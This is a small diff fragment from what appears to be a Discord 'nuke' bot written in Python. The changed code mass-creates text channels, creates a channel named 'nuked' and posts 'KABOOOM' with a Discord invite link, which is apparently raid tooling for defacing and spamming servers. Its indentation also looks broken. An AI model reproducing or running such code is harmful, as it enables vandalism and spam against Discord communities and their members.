@@ -83,7 +83,8 @@ async def create_text_channels(guild, name):
             created += 1
         except:
             pass
-           channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
+    await ctx.guild.create_text_channel('nuked')
+    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
     await channel.send("KABOOOM\ndiscord.gg/VMXyEHtMPj")
   else:
     await ctx.send("No")
